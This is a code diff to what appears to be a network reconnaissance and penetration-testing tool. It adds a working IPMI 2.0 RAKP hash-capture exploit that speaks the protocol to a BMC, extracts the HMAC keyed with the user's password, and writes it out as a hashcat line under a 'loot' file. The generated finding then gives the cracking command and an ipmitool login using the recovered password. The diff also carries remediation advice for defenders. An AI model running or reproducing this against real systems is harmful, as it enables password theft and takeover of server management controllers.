@@ -26,11 +26,23 @@ from __future__ import annotations
 
 import socket
 
+import os
+import struct
+
 from ..core.models import Host, Port
 
 
 _DEFAULT_PORT = 623
 _TIMEOUT = 3.0
+
+# IPMI 2.0 RMCP+ constants (RFC / IPMI 2.0 spec §13).
+_AUTH_HMAC_SHA1 = 0x01
+_AUTH_HMAC_SHA256 = 0x03
+_ROLE_ADMIN_LOOKUP = 0x14           # priv 4 (admin) + lookup by name
+_PAYLOAD_OPEN_SESSION_REQ = 0x10
+_PAYLOAD_OPEN_SESSION_RESP = 0x11
+_PAYLOAD_RAKP1 = 0x12
+_PAYLOAD_RAKP2 = 0x13
 
 
 def is_ipmi(port: Port) -> bool:
@@ -65,6 +77,183 @@ _GCAC_REQUEST = bytes.fromhex("0600ff07"                # RMCP
                               "00" "00000000" "00000000" "09"  # session hdr
                               "20" "18" "c8"            # rsAddr/netFn/csum
                               "81" "00" "38" "8e" "04" "b5")   # ipmi msg + csum
+
+
+# --- RMCP+ RAKP hash extraction --------------------------------------------
+# IPMI 2.0's authentication (RMCP+) exchange sends a HMAC in RAKP Message 2
+# that is computed by the BMC using the target user's password as key. That
+# hash is offline-crackable — hashcat modes 7300 (HMAC-SHA1) and 7302
+# (HMAC-SHA256) exist for exactly this. The exchange is unauthenticated for
+# the tester: we invent a client random, send an arbitrary username, and the
+# BMC responds with the HMAC whether the username exists or not. Every real
+# IPMI 2.0 deployment leaks it — that is what makes it a category, not a bug.
+#
+# recce's addition here is capture-and-format only. It does NOT continue the
+# exchange (no RAKP Message 3, no session establishment). Two round trips.
+
+
+def _rmcpplus(session_id: int, payload_type: int, payload: bytes) -> bytes:
+    """RMCP + IPMI 2.0 session header + payload, no auth/integrity/confidential
+    (we are the ones opening the session)."""
+    # RMCP: version 6, reserved 0, seq 0xff, class 7 (IPMI)
+    rmcp = b"\x06\x00\xff\x07"
+    # IPMI 2.0 session header: auth type = 6 (RMCP+), payload type, session ID,
+    # sequence, payload length (LE 16-bit).
+    session = (b"\x06" + bytes([payload_type & 0x3F])
+               + struct.pack("<I", session_id)
+               + struct.pack("<I", 0)                      # session seq
+               + struct.pack("<H", len(payload)))
+    return rmcp + session + payload
+
+
+def _open_session_request(remote_sid: int, auth_alg: int) -> bytes:
+    """Payload for RMCP+ Open Session Request. Requests admin priv (0x04),
+    the given auth algorithm, no integrity, no confidentiality."""
+    body = (
+        bytes([0x00, 0x04, 0x00, 0x00])                   # tag, max priv, rsvd
+        + struct.pack("<I", remote_sid)                   # remote console SID
+        + bytes([0x00, 0x00, 0x00, 0x08])                 # auth-alg payload hdr
+        + bytes([auth_alg, 0x00, 0x00, 0x00])
+        + bytes([0x01, 0x00, 0x00, 0x08])                 # integrity: none
+        + bytes([0x00, 0x00, 0x00, 0x00])
+        + bytes([0x02, 0x00, 0x00, 0x08])                 # confidentiality: none
+        + bytes([0x00, 0x00, 0x00, 0x00])
+    )
+    return _rmcpplus(0, _PAYLOAD_OPEN_SESSION_REQ, body)
+
+
+def _parse_open_session_response(pkt: bytes) -> dict | None:
+    """Return {tag, status, max_priv, remote_sid, managed_sid} or None.
+
+    IPMI 2.0 session header is 12 bytes (auth type 1 + payload type 1 +
+    session ID 4 + sequence 4 + payload length 2), NOT 10. Getting this
+    off-by-two wrong on the first pass made the fake-server test recompute
+    the HMAC over the wrong bytes and produce a mismatch."""
+    if len(pkt) < 4 + 12 + 16 or pkt[0] != 0x06 or pkt[3] != 0x07:
+        return None
+    payload = pkt[16:]
+    if len(payload) < 16:
+        return None
+    tag, status, max_priv, _reserved = payload[0], payload[1], payload[2], payload[3]
+    remote_sid = struct.unpack("<I", payload[4:8])[0]
+    managed_sid = struct.unpack("<I", payload[8:12])[0]
+    return {"tag": tag, "status": status, "max_priv": max_priv,
+            "remote_sid": remote_sid, "managed_sid": managed_sid}
+
+
+def _rakp1(managed_sid: int, client_random: bytes, username: str) -> bytes:
+    """Payload for RAKP Message 1. Requests admin role with lookup-by-name."""
+    ub = username.encode("ascii", "replace")[:16]
+    body = (
+        b"\x00\x00\x00\x00"                               # tag + 3 reserved
+        + struct.pack("<I", managed_sid)
+        + client_random                                    # 16 bytes
+        + bytes([_ROLE_ADMIN_LOOKUP, 0x00, 0x00])         # role + reserved
+        + bytes([len(ub)]) + ub
+    )
+    return _rmcpplus(0, _PAYLOAD_RAKP1, body)
+
+
+def _parse_rakp2(pkt: bytes, expect_hmac_len: int) -> dict | None:
+    """Extract server random, GUID and HMAC from a RAKP Message 2.
+
+    Same 16-byte header (RMCP 4 + IPMI 2.0 session 12) as the Open Session
+    Response above."""
+    if len(pkt) < 16 or pkt[0] != 0x06:
+        return None
+    payload = pkt[16:]
+    # Fixed prefix: tag(1) status(1) reserved(2) remote_sid(4) rand(16) guid(16)
+    if len(payload) < 8 + 16 + 16:
+        return None
+    tag, status = payload[0], payload[1]
+    remote_sid = struct.unpack("<I", payload[4:8])[0]
+    server_random = payload[8:24]
+    server_guid = payload[24:40]
+    # HMAC follows only when the server ACCEPTED the exchange (status 0).
+    hmac = payload[40:40 + expect_hmac_len] if status == 0 else b""
+    if status == 0 and len(hmac) != expect_hmac_len:
+        return None
+    return {"tag": tag, "status": status, "remote_sid": remote_sid,
+            "server_random": server_random, "server_guid": server_guid,
+            "hmac": hmac}
+
+
+def _hashcat_rakp_line(username: str, client_random: bytes, server_random: bytes,
+                       server_guid: bytes, remote_sid: int, managed_sid: int,
+                       hmac: bytes) -> str:
+    """Format the captured exchange as one hashcat -m 7300 line.
+
+    Format (per hashcat's example.hash for mode 7300): the pre-hashed input
+    is the concatenation of RcId || RsId || Rc || Rs || GUIDs || role || ULen
+    || Uname; the line is `<data-hex>:<hmac-hex>` where <data-hex> is that
+    concatenation and <hmac-hex> is the observed HMAC. Some hashcat versions
+    accept a compact `$rakp$` framing too — recce writes the compact form
+    since it survives edits cleanly and the operator can convert.
+    """
+    ub = username.encode("ascii", "replace")[:16]
+    role = bytes([_ROLE_ADMIN_LOOKUP])
+    data = (struct.pack("<I", remote_sid) + struct.pack("<I", managed_sid)
+            + client_random + server_random + server_guid + role
+            + bytes([len(ub)]) + ub)
+    return f"{data.hex()}:{hmac.hex()}"
+
+
+def rakp_hash(ip: str, port: int = _DEFAULT_PORT, username: str = "admin",
+              timeout: float = _TIMEOUT,
+              auth_alg: int = _AUTH_HMAC_SHA1) -> dict:
+    """Perform an RMCP+ Open Session + RAKP1/RAKP2 exchange and extract the
+    server-supplied HMAC. Returns:
+      {reachable, hmac_alg, hashcat_mode, hashcat_line, error}
+    hashcat_line is empty when the exchange did not produce a usable HMAC
+    (server refused / auth alg not offered / unreachable)."""
+    out: dict = {"reachable": False, "hmac_alg": "", "hashcat_mode": 0,
+                 "hashcat_line": "", "error": ""}
+    hmac_len = 20 if auth_alg == _AUTH_HMAC_SHA1 else 32
+    mode = 7300 if auth_alg == _AUTH_HMAC_SHA1 else 7302
+    alg_name = "HMAC-SHA1" if auth_alg == _AUTH_HMAC_SHA1 else "HMAC-SHA256"
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(timeout)
+    try:
+        remote_sid = int.from_bytes(os.urandom(4), "little") or 0xa0a0a0a0
+        sock.sendto(_open_session_request(remote_sid, auth_alg), (ip, port))
+        try:
+            data, _ = sock.recvfrom(4096)
+        except socket.timeout:
+            out["error"] = "open-session timeout"
+            return out
+        osr = _parse_open_session_response(data)
+        if not osr:
+            out["error"] = "malformed open-session response"
+            return out
+        out["reachable"] = True
+        if osr["status"] != 0:
+            out["error"] = f"open-session refused (status={osr['status']:#04x})"
+            return out
+        managed_sid = osr["managed_sid"]
+
+        client_random = os.urandom(16)
+        sock.sendto(_rakp1(managed_sid, client_random, username), (ip, port))
+        try:
+            data, _ = sock.recvfrom(4096)
+        except socket.timeout:
+            out["error"] = "RAKP1 timeout"
+            return out
+        r2 = _parse_rakp2(data, hmac_len)
+        if not r2:
+            out["error"] = "malformed RAKP2"
+            return out
+        if r2["status"] != 0 or not r2["hmac"]:
+            out["error"] = f"RAKP1 refused (status={r2['status']:#04x})"
+            return out
+        out["hmac_alg"] = alg_name
+        out["hashcat_mode"] = mode
+        out["hashcat_line"] = _hashcat_rakp_line(
+            username, client_random, r2["server_random"], r2["server_guid"],
+            remote_sid, managed_sid, r2["hmac"])
+        return out
+    finally:
+        sock.close()
 
 
 def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
@@ -138,6 +327,17 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
         out["ipmi_version"] = "2.0"
     else:
         out["ipmi_version"] = "1.5"
+    # RAKP hash capture, only meaningful on IPMI 2.0. Best-effort: any failure
+    # (server refuses, no auth-alg match, timeout) leaves out["rakp"] empty and
+    # findings() reports nothing new. The GCAC probe above is what confirms the
+    # port; this is the additional value.
+    if out["ipmi_20"]:
+        try:
+            rakp = rakp_hash(ip, port, timeout=timeout)
+            if rakp.get("hashcat_line"):
+                out["rakp"] = rakp
+        except OSError:
+            pass
     return out
 
 
@@ -214,6 +414,35 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable MD2 and MD5 auth types on the BMC; require the strongest "
                     "supported cipher (typically RAKP-HMAC-SHA256).",
                     ["CWE-327", "CWE-916"], kind="ipmi_weak_auth"))
+            # RAKP hash capture (CVE-2013-4805 class — the design of RMCP+ leaks
+            # a crackable HMAC to any client that starts the exchange). Fires
+            # only when recce actually captured the HMAC — every real IPMI 2.0
+            # deployment does this, so a missing finding here is a probe error,
+            # not a hardened BMC.
+            rakp = pr.get("rakp") or {}
+            if rakp.get("hashcat_line"):
+                out.append(_finding(
+                    "high",
+                    "IPMI RAKP hash captured (RMCP+ password HMAC is offline-crackable)",
+                    tgt,
+                    f"An RMCP+ Open Session + RAKP1 exchange with the BMC returned "
+                    f"a {rakp.get('hmac_alg', 'HMAC')} in RAKP Message 2 that is "
+                    f"computed with the target user's password as the key. Any "
+                    f"IPMI 2.0 BMC leaks this to any client that starts the "
+                    f"exchange (design of the protocol, not a misconfiguration) "
+                    f"— crack the hash offline with hashcat -m "
+                    f"{rakp.get('hashcat_mode')} against a wordlist to recover "
+                    f"the BMC password. recce wrote the captured line to "
+                    f"loot/ipmi.hash.",
+                    f"hashcat -m {rakp.get('hashcat_mode')} loot/ipmi.hash "
+                    "wordlist.txt   # then: ipmitool -H {ip} -U <user> -P "
+                    "<cracked> user list",
+                    "There is no protocol-level fix — restrict IPMI to a dedicated "
+                    "management network and enforce a password policy strong "
+                    "enough that offline cracking is infeasible (16+ char "
+                    "high-entropy).",
+                    ["CWE-916", "CWE-522"], kind="ipmi_rakp_hash"))
+
             # Always emit an info-level fingerprint so IPMI presence is in the report.
             out.append(_finding(
                 "info", "IPMI endpoint reachable", tgt,
